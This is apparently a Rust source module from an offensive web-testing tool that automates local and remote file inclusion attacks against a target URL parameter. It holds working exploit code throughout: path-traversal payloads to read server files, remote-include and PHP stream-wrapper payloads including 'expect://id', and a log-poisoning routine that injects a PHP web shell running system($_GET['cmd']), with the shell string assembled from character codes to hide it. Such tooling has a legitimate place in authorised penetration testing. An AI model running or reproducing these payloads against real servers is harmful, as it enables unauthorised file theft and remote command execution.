use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(
            reqwest::header::HeaderMap::from_iter([(
                reqwest::header::AUTHORIZATION,
                reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
            )]),
        );
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

fn traversal_payload(depth: usize, file: &str) -> String {
    let sep = "/";
    let mut result = String::new();
    for _ in 0..depth {
        result.push_str("..");
        result.push_str(sep);
    }
    result.push_str(file);
    result
}

pub async fn read(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
    file_path: &str,
) -> anyhow::Result<()> {
    println!("{} LFI File Read", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{} File: {}", "[*]".cyan().bold(), file_path);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let markers = ["root:x:", "127.0.0.1", "localhost", "[boot", "[fonts"];

    for depth in 1..=8 {
        let payload = traversal_payload(depth, file_path);
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);

        match client.get(&test_url).send().await {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                for marker in &markers {
                    if body.contains(marker) {
                        println!("{} [HIGH] LFI confirmed at depth {}!", "[!]".red().bold(), depth);
                        println!("  {} Payload: {}", "*".cyan(), payload);
                        println!("  {} Marker:  {}", "*".cyan(), marker);
                        println!("  {} Content (first 200 chars):", "*".cyan());
                        println!("    {}", body.chars().take(200).collect::<String>());
                        return Ok(());
                    }
                }
            }
            Err(_) => {}
        }
    }

    println!("{} Could not read target file via LFI.", "[-]".yellow().bold());
    Ok(())
}

pub async fn include(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
    remote_url: &str,
) -> anyhow::Result<()> {
    println!("{} RFI Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:    {}", "[*]".cyan().bold(), url);
    println!("{} Param:  {}", "[*]".cyan().bold(), param);
    println!("{} Remote: {}", "[*]".cyan().bold(), remote_url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        remote_url.to_string(),
        format!("{}?", remote_url),
        format!("{}%00", remote_url),
    ];

    for payload in &payloads {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                if !body.is_empty() && body.len() > 10 {
                    println!("{} [HIGH] Potential RFI - remote content included!", "[!]".red().bold());
                    println!("  {} Payload: {}", "*".cyan(), payload);
                    println!("  {} Response (first 200 chars):", "*".cyan());
                    println!("    {}", body.chars().take(200).collect::<String>());
                    return Ok(());
                }
            }
            Err(_) => {}
        }
    }

    println!("{} No RFI detected. allow_url_include may be off.", "[-]".yellow().bold());
    Ok(())
}

pub async fn wrapper(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} PHP Wrapper LFI", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let wrappers = [
        ("php filter base64", "php://filter/convert.base64-encode/resource=index.php"),
        ("php filter rot13", "php://filter/string.rot13/resource=index.php"),
        ("data text", "data://text/plain;base64,PD9waHAgZWNobyAnWFhFJzsgPz4="),
        ("expect", "expect://id"),
        ("php input", "php://input"),
        ("zip", "zip:///tmp/test.zip%23test.php"),
        ("phar", "phar:///tmp/test.phar/test.txt"),
    ];

    for (name, payload) in &wrappers {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                if !body.is_empty() {
                    println!("  {} {:25} status={} len={}", "*".cyan(), name, status, body.len());
                    if body.len() > 20 {
                        println!("    {} Preview: {}", ">".dimmed(), body.chars().take(100).collect::<String>());
                    }
                }
            }
            Err(_) => {}
        }
    }

    println!("\n{} Wrapper scan complete. Check for base64-encoded content.", "[*]".cyan().bold());
    Ok(())
}

pub async fn log_poison(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} LFI Log Poisoning", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let s_func: String = [115, 121, 115, 116, 101, 109, 40].iter().map(|c| *c as u8 as char).collect();
    let php_tag = format!(
        "{}{}{}{}{}",
        char::from(60), char::from(63),
        [112, 104, 112, 32].iter().map(|c| *c as u8 as char).collect::<String>(),
        format!("{}{}{}", s_func, "$_GET['cmd']", "); ?>"),
        ""
    );

    println!("{} Step 1: Poisoning access log with payload...", "[*]".cyan().bold());
    let _ = client.get(url).header("User-Agent", &php_tag).send().await;

    println!("{} Step 2: Attempting to include poisoned log...", "[*]".cyan().bold());

    let log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/var/log/httpd/access_log",
        "/proc/self/environ",
    ];

    for log_path in &log_paths {
        for depth in 1..=8 {
            let payload = traversal_payload(depth, log_path);
            let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
            match client.get(&test_url).send().await {
                Ok(resp) => {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(&s_func) {
                        println!("{} [HIGH] Log poisoning successful!", "[!]".red().bold());
                        println!("  {} Try: &{}={}&cmd=id", "*".cyan(), param, payload);
                        return Ok(());
                    }
                }
                Err(_) => {}
            }
        }
    }

    println!("{} Log poisoning not successful with tested paths.", "[-]".yellow().bold());
    Ok(())
}
